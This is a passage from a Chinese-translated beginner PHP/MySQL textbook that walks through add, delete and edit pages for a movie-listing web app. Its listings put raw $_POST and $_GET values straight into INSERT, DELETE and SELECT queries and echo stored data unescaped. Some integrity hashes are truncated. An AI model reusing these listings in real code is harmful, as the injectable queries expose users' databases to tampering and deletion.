                for="movie_genre_checkbox_action"><?= $genre ?></label>
        </div>
<?php
}
?>
    </div>
</div>
    <button class="btn btn-primary" type="submit"
        name="add_movie_submission">Add Movie</button>
</form>
```

注意页面是自引用的，因为 action 属性被设置为 $_SERVER['PHP_SELF']：

```
`<form ... action="<?= $_SERVER['PHP_SELF']; ?>">`
```

## 16. 使用 Web 应用程序添加数据

*使用 Bootstrap 的客户端验证*

另请注意，我们正在使用 Bootstrap 的客户端验证。这要求我们执行以下操作：

- 1. 将表单的 class 属性设置为 needs-validation 并添加 novalidate 属性：
```
<form class="needs-validation" novalidate ...
```
- 2. 使用 required 属性标记输入元素，以确保我们希望验证的字段在 POST 请求的一部分中得到验证并由用户的浏览器发送。
```
<input type="number" ... required>
```
- 3. 添加 class 属性设置为 invalid-feedback 的 <div> 元素，其中包含我们希望用户在忘记填写字段时看到的验证文本。我们将这些元素直接添加到我们希望验证的 <input> 元素下方。列表 16.5 是“运行时间”输入字段的完整 HTML 标记以及我们在用户忘记输入值时希望用户看到的无效反馈。
- 4. 在表单之后在 <script> 标签中添加列表 16.6 中的 JavaScript 代码。

### 列表 16.5.

```
1. <div class="form-group row">
2.   <label for="movie_running_time_in_minutes"
3.     class="col-sm-3 col-form-label-lg">Running Time (min)</label>
4. <div class="col-sm-8">
5.   <input type="number" class="form-control"
6.     id="movie_running_time_in_minutes"
7.     name="movie_running_time_in_minutes"
8.     placeholder="Running time (in minutes)" required>
9.   <div class="invalid-feedback">
10.     Please provide a valid running time in minutes.
11.   </div>
12. </div>
13. </div>
```

> 使用 Bootstrap[^3]（版本 4.3）实现客户端验证的完整说明可以在网上找到。

[3] 使用 Bootstrap 进行客户端验证: https://getbootstrap.com/docs/4.3/components/forms/#validation

### 列表 16.6.

```javascript
</form>
<script>
// JavaScript for disabling form submissions if there are invalid fields
(function() {
  'use strict';
  window.addEventListener('load', function() {
    // Fetch all the forms we want to apply custom Bootstrap validation styles to
    var forms = document.getElementsByClassName('needs-validation');
    // Loop over them and prevent submission
    var validation = Array.prototype.filter.call(forms, function(form) {
      form.addEventListener('submit', function(event) {
        if (form.checkValidity() === false) {
          event.preventDefault();
          event.stopPropagation();
        }
        form.classList.add('was-validated');
      }, false);
    });
  }, false);
})();
</script>
```

图 16.5 显示了如果我们忘记为“运行时间”添加条目，我们的“添加电影”页面会是什么样子。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_185_0.png)

请注意，“标题”、“评分”和“导演”已成功验证。但是，“运行时间”验证失败。

### 显示“添加电影”表单

“添加电影”表单应仅在首次导航到 addmovie.php 页面时或在提交表单后出现验证错误时显示。因此，我们将在 <hr/> 元素之后立即创建一个名为 $display_add_movie_form 的布尔变量并将其设置为 true：

```php
<hr/>
<?php
    $display_add_movie_form = true;
```

## 16. 使用 Web 应用程序添加数据

接下来，我们将表单和 JavaScript 验证代码包装在一个检查此变量的条件语句中。参见列表 16.7。

### 列表 16.7.

```php
1.  if ($display_add_movie_form)
2.  {
3. ?>
4. <form ...>
5.  ...
6. </form>
7. <script>
8.  ...
9. </script>
10. <?php
11. } // Display add movie form
12. ?>
```

### 将电影数据插入数据库

当用户成功在表单字段中输入所需数据并提交表单时，我们将数据插入 Movie 数据库的 movieListing 表中。

此外，即使我们在客户端验证字段输入，仍然很重要在服务器端也验证字段输入。我们不能相信每个访问我们网站的浏览器或用户都会执行任何验证。因此，我们创建一个条件检查以确保在将它们插入数据库之前必需字段存在，并将此代码放在表单标记之前，如列表 16.8 所示。

### 列表 16.8.

```php
1.  // pro-tip: you can test multiple variables within a single isset() call
2. if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
3.      $_POST['movie_rating'], $_POST['movie_director'],
4.      $_POST['movie_running_time_in_minutes']))
5. {
6.  // Code to insert new movie into database
7.  ...
8. }
9.  ...
10. if ($display_add_movie_form) {
11. ?>
12. <form ...>
```

在上面的代码中，我们确保我们要求填写的字段已设置。



> 请注意，您可以在单个 isset() 函数调用中测试多个变量。

假设用户输入了所有必需的数据，我们现在可以将数据插入数据库。
请参阅列表 16.9。

### 列表 16.9.

```php
1. <?php
2. if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
3.     $_POST['movie_rating'], $_POST['movie_director'],
4.     $_POST['movie_running_time_in_minutes']))
5. {
6.     require_once('dbconnection.php');
7. 
8.     $movie_title = $_POST['movie_title'];
9.     $movie_rating = $_POST['movie_rating'];
10.    $movie_director = $_POST['movie_director'];
11.    $movie_runtime = $_POST['movie_running_time_in_minutes'];
12.    $checked_movie_genres = $_POST['movie_genre_checkbox'];
13. 
14.    $movie_genre_text = "";
15.    if (isset($checked_movie_genres))
16.    {
17.        $movie_genre_text = implode(",", $checked_movie_genres);
18.    }
19. 
20.    $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
21.        or trigger_error(
22.        'Error connecting to MySQL server for ' . DB_NAME,
23.        E_USER_ERROR
24.        );
25. 
26.    $query = "INSERT INTO movieListing (title, rating, director,
27.             running_time_in_minutes, genre)"
28.        . "VALUES ('$movie_title', '$movie_rating', '$movie_director',
29.            '$movie_runtime', '$movie_genre_text')";
30. 
31.    mysqli_query($dbc, $query)
32.        or trigger_error(
33.        'Error querying database movieListing: Failed to insert movie listing',
34.        E_USER_ERROR
35.        );
36. 
37.    //
```
```

## 16. 使用 Web 应用程序添加数据

### 从复选框数组中提取类型

注意上面处理电影类型的代码段：

```
$movie_genre_text = "";

if (isset($checked_movie_genres))
{
    $movie_genre_text = implode(", ", $checked_movie_genres);
}
```

由于一部电影可能有多个类型，我们从复选框数组中创建所选类型的逗号分隔列表。我们仅在用户至少选择了一个类型时才通过调用 implode() 函数来实现这一点。如果用户未选择任何类型，复选框数组将不存在。因此，我们需要在调用 implode() 之前先检查它是否已设置。如果用户未选择类型，我们将在 movieListing 表的 genre 字段中插入一个空字符串。

### 防止显示“添加电影”表单

在将新电影信息插入数据库后，我们通过将 $display_add_movie_form 设置为 false 来防止表单再次显示：

```
mysqli_query($dbc, $query)
    or trigger_error(
        'Error querying database movieListing: Failed to insert movie listing',
        E_USER_ERROR
    );

$display_add_movie_form = false;
```

### 显示已添加的详细信息以及添加另一部电影的链接

为了让此页面更有用，我们应该让用户知道他们的电影信息已成功添加到数据库。让我们通过显示一个类似图 16.6 的页面和表格来实现这一点，其中包括添加另一部电影的链接，如图所示。

列表 16.10 列出了用于显示已添加电影详细信息的 HTML 标记和 PHP 代码。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_188_0.png)

### 列表 16.10.

```
1. $display_add_movie_form = false;
2. ?>
3. <h3 class="text-info">The Following Movie Details were Added:</h3><br/>
4. 
5. <h1><?= $movie_title ?></h1>
6. <table class="table table-striped">
7. <tbody>
8. <tr>
9. <th scope="row">Rating</th>
10. <td><?= $movie_rating ?></td>
11. </tr>
12. <tr>
13. <th scope="row">Director</th>
14. <td><?= $movie_director ?></td>
15. </tr>
16. <tr>
17. <th scope="row">Running Time (minutes)</th>
18. <td><?= $movie_runtime ?></td>
19. </tr>
20. <tr>
21. <th scope="row">Genre</th>
22. <td><?= $movie_genre_text ?></td>
23. </tr>
24. </tbody>
25. </table>
26. <hr/>
27. <p>Would you like to <a href='<?= $_SERVER['PHP_SELF'] ?>'> add another movie</a>?</p>
28. <?php
29. }
30. 
31. if ($display_add_movie_form) {
```

### 完整代码列表

而现在，列表 16.11 是 addmovie.php 页面的完整源代码。

### 列表 16.11.

```
1. <!DOCTYPE html>
2. <html>
3. <head>
4. <title>Add a Movie</title>
5. <link rel="stylesheet"
6. href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
7. integrity="sha384-GJzqFGwb1QT..."
8. crossorigin="anonymous">
9. </head>
```

## 16. 使用 Web 应用程序添加数据

```php
10. <body>
11.     <div class="card">
12.         <div class="card-body">
13.             <h1>Add a Movie</h1>
14.             <nav class="nav">
15.                 <a class="nav-link" href="index.php">Movies I Like</a>
16.             </nav>
17.             <hr/>
18.         <?php
19.             $display_add_movie_form = true;
20.
21.             $genres = [
22.                 'Action', 'Adventure', 'Comedy', 'Documentary', 'Drama',
23.                 'Fantasy', 'Horror', 'Romance', 'Science Fiction'
24.             ];
25.             // pro-tip: you can test multiple variables within a single isset() call
26.             if (isset($_POST['add_movie_submission'], $_POST['movie_title'],
27.                     $_POST['movie_rating'], $_POST['movie_director'],
28.                     $_POST['movie_running_time_in_minutes']))
29.             {
30.                 require_once('dbconnection.php');
31.
32.                 $movie_title = $_POST['movie_title'];
33.                 $movie_rating = $_POST['movie_rating'];
34.                 $movie_director = $_POST['movie_director'];
35.                 $movie_runtime = $_POST['movie_running_time_in_minutes'];
36.                 $checked_movie_genres = $_POST['movie_genre_checkbox'];
37.
38.                 $movie_genre_text = "";
39.                 if (isset($checked_movie_genres))
40.                 {
41.                     $movie_genre_text = implode(", ", $checked_movie_genres);
42.                 }
43.
44.                 $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
45.                     or trigger_error(
46.                         'Error connecting to MySQL server for ' . DB_NAME,
47.                         E_USER_ERROR
48.                     );
49.
50.                 $query = "INSERT INTO movielisting (title, rating, director, "
51.                         . " running_time_in_minutes, genre) "
52.                         . "VALUES ('$movie_title', '$movie_rating', '$movie_director', "
53.                         . "'$movie_runtime', '$movie_genre_text')";
54.
55.                 mysqli_query($dbc, $query)
56.                     or trigger_error(
57.                         'Error querying database movielisting: Failed to insert movie listing',
58.                         E_USER_ERROR
59.                     );
60.
61.                 $display_add_movie_form = false;
62.         ?>
```

### 完整代码列表

```
<h3 class="text-info">The Following Movie Details were Added:</h3><br/>
<h1><?= $movie_title ?></h1>
<table class="table table-striped">
    <tbody>
        <tr>
            <th scope="row">Rating</th>
            <td><?= $movie_rating ?></td>
        </tr>
        <tr>
            <th scope="row">Director</th>
            <td><?= $movie_director ?></td>
        </tr>
        <tr>
            <th scope="row">Running Time (minutes)</th>
            <td><?= $movie_runtime ?></td>
        </tr>
        <tr>
            <th scope="row">Genre</th>
            <td><?= $movie_genre_text ?></td>
        </tr>
    </tbody>
</table>
<hr/>
<p>Would you like to <a href="<?= $_SERVER['PHP_SELF']?>">add another movie</a>?</p>
<?php
}

if ($display_add_movie_form)
{
?>
<form class="needs-validation" novalidate method="POST"
    action="<?= $_SERVER['PHP_SELF']?>">
    <div class="form-group row">
        <label for="movie_title"
            class="col-sm-3 col-form-label-lg">Title</label>
        <div class="col-sm-8">
            <input type="text" class="form-control" id="movie_title"
                name="movie_title" placeholder="Title" required>
            <div class="invalid-feedback">
                Please provide a valid movie title.
            </div>
        </div>
    </div>
    <div class="form-group row">
        <label for="movie_rating"
            class="col-sm-3 col-form-label-lg">Rating</label>
        <div class="col-sm-8">
            <select class="custom-select" id="movie_rating"
                name="movie_rating" required>
                <option value="" disabled selected>Rating...</option>
```



## 16. 使用 Web 应用程序添加数据

```
114.             <option value="G">G</option>
115.             <option value="PG">PG</option>
116.             <option value="PG-13">PG-13</option>
117.             <option value="R">R</option>
118.             </select>
119.             <div class="invalid-feedback">
120.             Please select a movie rating.
121.             </div>
122.             </div>
123.             </div>
124.             <div class="form-group row">
125.             <label for="movie_director"
126.             class="col-sm-3 col-form-label-lg">Director</label>
127.             <div class="col-sm-8">
128.             <input type="text" class="form-control" id="movie_director"
129.             name="movie_director" placeholder="Director" required>
130.             <div class="invalid-feedback">
131.             Please provide a valid movie director.
132.             </div>
133.             </div>
134.             </div>
135.             <div class="form-group row">
136.             <label for="movie_running_time_in_minutes"
137.             class="col-sm-3 col-form-label-lg">Running Time (min)</label>
138.             <div class="col-sm-8">
139.             <input type="number" class="form-control"
140.             id="movie_running_time_in_minutes"
141.             name="movie_running_time_in_minutes"
142.             placeholder="Running time (in minutes)" required>
143.             <div class="invalid-feedback">
144.             Please provide a valid running time in minutes.
145.             </div>
146.             </div>
147.             </div>
148.             <div class="form-group row">
149.             <label class="col-sm-3 col-form-label-lg">Genre</label>
150.             <div class="col-sm-8">
151.             <?php
152.             foreach ($genres as $genre)
153.             {
154.             ?>
155.             <div class="form-check form-check-inline col-sm-3">
156.             <input class="form-check-input" type="checkbox"
157.             id="movie_genre_checkbox_action"
158.             name="movie_genre_checkbox[]"
159.             value="<?= $genre ?>">
160.             <label class="form-check-label"
161.             for="movie_genre_checkbox_action"><?= $genre ?></label>
162.             </div>
163.             <?php
164.             }
165.             ?>
```

### 完整代码清单

```
166.     </div>
167.     </div>
168.     <button class="btn btn-primary" type="submit"
169.         name="add_movie_submission">Add Movie</button>
170. </form>
171. <script>
172. // JavaScript for disabling form submissions if there are invalid fields
173. (function() {
174.     'use strict';
175.     window.addEventListener('load', function() {
176.     // Fetch all the forms we want to apply custom Bootstrap validation styles to
177.     var forms = document.getElementsByClassName('needs-validation');
178.     // Loop over them and prevent submission
179.     var validation = Array.prototype.filter.call(forms, function(form) {
180.         form.addEventListener('submit', function(event) {
181.             if (form.checkValidity() === false) {
182.                 event.preventDefault();
183.                 event.stopPropagation();
184.             }
185.             form.classList.add('was-validated');
186.         }, false);
187.     }, false);
188.     }, false);
189. })();
190. </script>
191. <?php
192. } // Display add movie form
193. ?>
194. </div>
195. </div>
196. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
197.     integrity="sha384-q8i/X+965DzO0rT7abK41JSTqIAqVgRVzpbzo5snXKpqYfRvH+8abtTE1Pi6jizo"
198.     crossorigin="anonymous"></script>
199. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
200.     integrity="sha384-wHAiFfRl8U1abW3Og8zh9lNwAbd14Pi2jh4P+opef0gT8K27Xr1JzZ8W3U1dYfW"
201.     crossorigin="anonymous"></script>
202. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
203.     integrity="sha384-B0Uglyr+r7cqK1l5JgaXjtg..."
204.     crossorigin="anonymous"></script>
205. </body>
206. </html>
```

### 从列表页面链接到“添加电影”页面

现在我们的“添加电影”页面已完成，让我们从主“我喜欢的电影” index.php 脚本中添加一个链接到 addmovie.php 脚本。（图 16.7）。

在 <body> 元素中添加指向 addmovie.php 脚本的链接，位于“我喜欢的电影”标题 index.php 脚本正下方：

```
<body>
<div class="card">
    <div class="card-body">
        <h1>Movies I Like</h1>
        <p>If you have a movie you would like to include, feel free to
            <a href='addmovie.php'> add one</a></p>
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_194_0.png)

## 练习

- 1. 创建一个“添加电影”页面，其中包含一个表单，允许用户在数据库中插入电影。
  - 1. 确保用户提交标题、评分、导演、播放时长和类型。
  - 2. 在电影列表页面上放置一个“添加电影”按钮。
- 2. 向表单中至少添加一种新的电影类型。确保数据保存到数据库中。在详情页面上显示所选的值（如果已选择）。
- 3. 向表单中添加电影发行年份的字段。允许从 1900 年到未来十年内的年份。确保数据保存到数据库中。在详情页面上显示发行年份。

## 17. 使用 Web 应用程序删除数据

> “你们大多数人都熟悉程序员的美德。当然有三种：懒惰、急躁和自负。”
> -Larry Wall

在本章中，我们为我们的 *电影列表* 应用程序添加删除电影列表数据的功能。

除了提供添加电影的机制之外，通过 Web 界面提供删除电影的手段似乎也是合理的。因此，让我们添加一个脚本，允许用户删除电影列表数据。

> > *请注意，您通常希望限制谁可以从数据库中删除项目。*  
> > *在后续关于[security]的章节中，我将向您展示如何通过用户登录正确限制 Web 应用程序删除数据的访问权限。*

### 向电影列表添加删除链接

我们可以设计我们的 *电影列表* 应用程序以包含删除电影的能力有几种方法。我选择在主“我喜欢的电影” index.php 页面上的每个电影列表中添加链接以删除每部电影。如果我们使用一个看起来像垃圾桶的图标，链接的用途应该在图 17.1 中显而易见

每个垃圾桶链接将带我们到（尚未编写的）removemovie.php 脚本，并将指定电影的主键（来自 movielisting 表）作为查询参数发送过去。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_196_0.png)

### 向电影列表添加删除链接

### 添加 Font Awesome

要使用此垃圾桶链接，我们需要在 <head> 元素标签集中添加指向免费 Font Awesome[1] 样式的链接。Font Awesome 以字体形式提供许多图标，因此我们无需创建数十或数百个微小的自定义图形。

```
<head>
...
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
integrity="sha384-50oBUEnvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUOFtY4JTAiYv"
crossorigin="anonymous">
</head>
```

### 在电影列表表中添加“删除链接”列

接下来，我们需要通过添加一个空白的表头列来为电影列表表添加一列。然后，我们可以为每个电影列表添加一个数据项，其中包含指向 removemovie.php 的链接以及电影的 id 作为查询参数到表格行。让我们将查询参数命名为 id_to_delete，如清单 17.1 所示。

```
1. <table class="table table-striped table-hover">
2. <thead>
3. <tr>
4. <th scope="col">Movie Title</th>
5. <th scope="col"></th>
6. </tr>
7. </thead>
8. <tbody>
9. <?php
10. while($row = mysqli_fetch_assoc($result))
11. {
12. echo "<tr><td><a class='nav-link' href='moviedetails.php?id="
13. . $row['title'] . "">" . $row['title'] . "</a></td>"
14. . "<td><a class='nav-link' href='removemovie.php?id_to_delete="
15. . $row['id'] . "">" . "<i class='fas fa-trash-alt'></i></a></td></tr>";
16. }
17. ?>
18. </tbody>
19. </table>
```

> [1] Font Awesome: https://fontawesome.com




## 17. 使用 Web 应用删除数据

在浏览器中重新加载更新后的 index.php 脚本。现在，当我们将鼠标悬停在某个电影条目的垃圾桶图标上时，我们看到的目标超链接是 remove_movie.php 脚本。该超链接包含一个查询参数 id_to_delete，其值设置为我们要删除的电影的主键。参见图 17.2。

浏览器发送此查询参数，PHP 将其解析到 $_GET[] 超全局数组中。

### 创建“删除电影页面”

任何专门用于从应用程序中删除数据的页面都应该清楚地显示我们想要删除的内容。这样用户就可以确认是否要删除该信息。例如，当我们选择要删除的电影时，浏览器应该带我们进入一个类似于图 17.3 的页面。

虽然不是必需的，但我喜欢将重要的文本和操作——比如选择“删除电影”提交按钮——放在<span style="color:red">红色</span>中。Bootstrap 也有一些特定于按钮的类，我们可以用来区分它们。

### 初始页面布局

创建另一个 PHP 脚本，命名为 remove_movie.php。同样，从一个包含必要 Bootstrap 框架组件的简单模板开始，并将页面标题设置为“删除电影”。接下来，在我们开头 <body> 标签的正下方添加几个嵌套的 <div> 标签，以便在 Bootstrap 卡片中显示我们的电影，如清单 17.2 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_198_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_198_1.png)

## 17. 使用 Web 应用删除数据

### 清单 17.3.

```php
<body>
  <div class="card">
    <div class="card-body">
      <h1>Remove a Movie</h1>
<?php
require_once('dbconnection.php');

$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
  or trigger_error(
  'Error connecting to MySQL server for' . DB_NAME,
  E_USER_ERROR
);
```

### 前往“删除电影”页面的多种方式

正如图 17.4 所示，页面显示了要删除的电影的详细信息，以及两个按钮。这给了用户选择是否删除电影的机会。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_200_0.png)

当用户选择其中一个按钮（“删除电影”或“不删除”）时，remove_movie.php 脚本被调用，并带有所选按钮的 name 属性。电影 id 属性被发送并解析到 $_POST[] 超全局数组中。

用户还可以通过另外两种方式导航到 remove_movie.php 脚本。第一种，在 index.php 页面上选择一个电影的垃圾桶链接以删除该电影。另一种（非预期机制）是在浏览器的 URL 地址栏中直接输入 remove_movie.php，即没有包含电影 id 的查询参数。

我们需要处理所有这些可能导航到 remove_movie.php 脚本的方法。因此，我们先处理预期的导航方式，再处理非预期的。

处理这些选择的最佳方式是创建一个 if/elseif/else 代码块，如清单 17.4 所示。

### 创建“删除电影页面”

### 清单 17.4.

```
1. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
2.     or trigger_error(
3.         'Error connecting to MySQL server for' . DB_NAME, E_USER_ERROR
4.     );
5.
6. if (isset($_POST['delete_movie_submission']) && isset($_POST['id'])):
7.     ...
8. elseif (isset($_POST['do_not_delete_movie_submission'])):
9.     ...
10. elseif (isset($_GET['id_to_delete'])):
11.     ...
12. else: // Unintended page link
13.     ...
14. endif;
```

下面的部分将根据我们如何导航到 `remove_movie.php` 来逐一解析每个条件。

### 从 index.php 导航

这是我们前往 `remove_movie.php` 页面的第一种预期方式。因此，我们将处理第二个 elseif 块：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_201_0.png)

```
elseif (isset($_GET['id_to_delete'])):
```

当用户选择他们想要删除的电影的垃圾桶图标之一时，就会达到这个条件。他们应该会看到一个类似图 17.4 的页面。

首先，我选择使用 Bootstrap 的 `text-danger` 类显示删除确认消息。参见图 17.5

```
    elseif (isset($_GET['id_to_delete'])):
?>
    <h3 class="text-danger">Confirm Deletion of the Following Movie Details:</h3><br/>
<?php
```

### 创建“删除电影页面”

```
19.     <th scope="row">Genre</th>
20.     <td><?= $row['genre'] ?></td>
21. </tr>
22. </tbody>
23. </table>
```

最后，显示一个表单（图 17.7）——该表单自引用 remove_movie.php 页面——包含两个提交按钮：一个用于删除电影，另一个用于不删除电影。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_203_0.png)

### 清单 17.7.

```
1. </table>
2. <form method="POST" action="<?= $_SERVER['PHP_SELF'] ?>">
3.     <div class="form-group">
4.         <div class="col-sm-2">
5.             <button class="btn btn-danger" type="submit"
6.                     name="delete_movie_submission">Delete Movie
7.             </button>
8.         </div>
9.         <div class="col-sm-2">
10.            <button class="btn btn-success" type="submit"
11.                    name="do_not_delete_movie_submission">Don't Delete
12.            </button>
13.        </div>
14.        <input type="hidden" name="id" value="<?= $id ?>">
15.    </div>
16. </form>
```

注意清单 17.7 中两个按钮的 name 属性具有描述性：

```
<button class="btn btn-danger" type="submit"
        name="delete_movie_submission">Delete Movie</button>
...
<button class="btn btn-success" type="submit"
        name="do_not_delete_movie_submission">Don't Delete</button>
```

> 在 Bootstrap 中，将 btn btn-danger 或 btn btn-success 添加到按钮元素的 class 属性中，可以使按钮显示为红色或绿色。

注意，一旦我们的代码运行，被删除的电影将不再列出（图 17.8）。

### 按下“不删除”按钮

这是前往 remove_movie.php 页面的第三种预期方式。因此，我们将处理第一个 elseif 块：

```
elseif (isset($_POST['do_not_delete_movie_submission'])):
```

如果此条件为 true，那是因为用户选择了“不删除”提交按钮。这会向 remove_movie.php 发送 POST 请求，表单变量 do_not_delete_movie_submission 位于 $_POST[] 超全局数组中。

在此块中，我们将用户自动重定向到主“我喜欢的电影”index.php 页面。通过使用 header()[2] 函数，我们发送一个 Location:，目标 URL 为 index.php。

```
elseif (isset($_POST['do_not_delete_movie_submission'])):

    header("Location: index.php");
    exit;
```

当页面重新加载时，请注意电影并未被删除（图 17.9）。

### 软删除与硬删除

根据你的应用程序，你可能不希望立即从数据库中删除某行。如果用户想要恢复记录怎么办？在这种情况下，许多程序使用“软”删除，方法是向表添加一个布尔列，以表示某内容已被“删除”。当查询记录时，排除该字段为 true 的行。要恢复记录，我们只需将该字段翻转为 false。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_205_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_205_1.png)

[2] header(): https://php.net/header

## 17. 使用 Web 应用删除数据

### 非预期导航方式

由于 HTTP 请求来自客户端，理论上，查询字符串中可能会含有意料之外、不需要甚至恶意的参数。其他所有可能导航到 remove_movie.php 页面的条件都是非预期的。因此，我们处理 else 块：

```
else: // Unintended page link
```

由于上述所有条件都是我们希望应用程序以特定方式运行的情况，因此通常的做法是将应用程序对不可预测行为的响应放在 else 条件中。在这种情况下，我们重定向到主“我喜欢的电影”index.php 页面：

```
else: // Unintended page link - No movie to remove, link back to index

    header("Location: index.php");
    exit;

endif;
```

### 完整代码清单

清单 17.9 包含了 remove_movie.php 页面的完整代码。

### 清单 17.9.

```
1. <html>
2. <head>
3. <title>Remove a Movie</title>
4. <link rel="stylesheet"
5. href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
6. integrity="sha384-GJzqFGwbIQTTN6wy59FF1BuGJPjLSa9DkKMp0DgiMDm4iYMj70gZlKYbi706tHS"
7. crossorigin="anonymous">
8. </head>
9. <body>
10. <div class="card">
11. <div class="card-body">
12. <h1>Remove a Movie</h1>
13. <?php
14. require_once('dbconnection.php');
15. 
16. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
17. or trigger_error(
18. 'Error connecting to MySQL server for DB_NAME.',
19. E_USER_ERROR
20. );
21. 
22. if (isset($_POST['delete_movie_submission']) && isset($_POST['id'])):
```




## 完整代码列表

```php
$id = $_POST['id'];

$query = "DELETE FROM movielisting WHERE id = $id";

$result = mysqli_query($dbc, $query)
    or trigger_error('Error querying database movielisting', E_USER_ERROR);

header("Location: index.php");
exit;

elseif (isset($_POST['do_not_delete_movie_submission'])):

    header("Location: index.php");
    exit;

elseif (isset($_GET['id_to_delete'])):
    ?>
    <h3 class="text-danger">Confirm Deletion of the Following
        Movie Details:</h3><br/>
    <?php
    $id = $_GET['id_to_delete'];

    $query = "SELECT * FROM movielisting WHERE id = $id";

    $result = mysqli_query($dbc, $query)
        or trigger_error('Error querying database movielisting', E_USER_ERROR);

    if (mysqli_num_rows($result) == 1):

        $row = mysqli_fetch_assoc($result)
    ?>
    <h1><?= $row['title'] ?></h1>
    <table class="table table-striped">
        <tbody>
            <tr>
                <th scope="row">Rating</th>
                <td><?= $row['rating'] ?></td>
            </tr>
            <tr>
                <th scope="row">Director</th>
                <td><?= $row['director'] ?></td>
            </tr>
            <tr>
                <th scope="row">Running Time (minutes)</th>
                <td><?= $row['running_time_in_minutes'] ?></td>
            </tr>
            <tr>
                <th scope="row">Genre</th>
                <td><?= $row['genre'] ?></td>
```
## 17. 使用 Web 应用程序删除数据

```php
73. </tr>
74. </tbody>
75. </table>
76. <form method="POST" action="<?= $_SERVER['PHP_SELF'] ?>">
77. <div class="form-group row">
78. <div class="col-sm-2">
79. <button class="btn btn-danger" type="submit" name="delete_movie_submission">
80. Delete Movie
81. </button>
82. </div>
83. <div class="col-sm-2">
84. <button class="btn btn-success" type="submit" name="do_not_delete_movie_submission">
85. Don’t Delete
86. </button>
87. </div>
88. </div>
89. <input type="hidden" name="id" value="<?= $id ?>">
90. </form>
91. <?php
92. else:
93. ?>
94. <h3>No Movie Details :-</h3>
95. <?php
96. endif;
97. else: // Unintended page link - No movie to remove, go back to index
98. header("Location: index.php");
99. exit;
100. endif;
101. ?>
102. </div>
103. </div>
104. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
105. integrity="sha384-DzOOrT7b6V8o9c6jUq3o1rFz4gf1a8tT6trf1OaTjHppL5" crossorigin="anonymous"></script>
106. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
107. integrity="sha384-wHAIFRlmFYg5s5Q8K5" crossorigin="anonymous"></script>
108. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
109. integrity="sha384-BOgVL0Yy2x8K" crossorigin="anonymous"></script>
110. </body>
111. </html>
```

## 练习

- 1. 在电影列表页面添加一个可点击的垃圾桶图标（每个电影一个），以便用户可以删除单个电影。
- 2. 创建删除电影页面以显示电影详情和删除确认。
- 3. 奖励：切换行为以使用软删除并标记电影不显示。更新列表和详情页面以隐藏标记为“deleted.”的电影。

## 第18章

## 使用 Web 应用程序编辑数据

> > “I develop for Linux for a living. I used to develop for DOS. Going from DOS to Linux is like trading a glider for an F117.”
> >
> > —Lawrence Foard, entropy@world.std.com

## 18. 使用 Web 应用程序编辑数据

本章中，我们将向我们的 *Movie Listing* 应用程序添加编辑电影列表数据的能力。

由于我们已经拥有添加和删除电影的能力，我们大概也应该添加编辑电影列表的能力。从电影的“Movie Details”页面，我们希望导航到一个带有表单的页面，该表单允许我们修改所有电影详情。成功编辑电影数据后，我们希望被带回该电影的“Movie Details”页面，以便立即看到更改的反映。

> > 请注意，您通常希望限制谁可以编辑数据库中的项目。后续关于 *security* 的章节展示了如何通过用户登录正确限制对 Web 应用程序编辑数据的访问。

### 将电影详情链接到编辑页面

在 moviedetails.php 脚本的闭合 </table> 元素之后添加一条水平线和一个链接到（尚未编写的）editmovie.php 脚本：

```html
</table>
<hr/>
<p>If you would like to change any of the details of this movie, feel free to <a href='editmovie.php?id_to_edit=<?=$row['id']?>'> edit it</a></p>
```

更新后的“Movie Details”页面应如下图 18.1 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_212_0.png)

当我们运行更新后的 moviedetails.php 脚本时，我们可以看到将鼠标悬停在“edit it”上时，我们的目的地超链接是 editmovie.php 脚本以及查询参数 id_to_edit 设置为我们感兴趣的编辑电影的主键，如图 18.2 所示。

该查询参数包含在 $row['id'] 中，并将通过 $_GET[] 超全局数组发送。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_212_1.png)

### 创建编辑页面

我们创建一个 `editmovie.php` 脚本，它显示的表单与“Add a Movie” `addmovie.php` 脚本基本相同。不同之处在于我们使用数据库中的电影详情预先填充表单输入。此外，我们使用 `addmovie.php` 脚本中的相同 Bootstrap 验证代码，以防用户无意中从表单中删除了必填字段。当我们为想要更新的电影选择“edit it”时，我们的浏览器应带我们到如下图 18.3 所示的页面。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_213_0.png)

### DRY（不要重复自己）

为了更易于维护并减少代码重复，您应该重用相同的 `addmovie.php` 表单标记和代码。您可以使用 PHP 的 `require_once`[^1] 语句在 `addmovie.php` 和 `editmovie.php` 脚本中实现这一点。我们将把这作为练习留给您。

[1] `require_once`: https://php.net/require_once

